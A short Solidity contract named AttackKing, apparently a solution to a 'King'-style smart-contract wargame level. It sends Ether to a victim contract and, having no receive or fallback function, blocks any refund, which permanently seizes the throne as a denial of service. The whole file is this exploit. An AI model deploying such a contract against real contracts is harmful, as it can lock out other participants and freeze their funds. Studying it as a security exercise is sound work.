// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    function attack(address victim) external payable {
        (bool sent,) = victim.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}
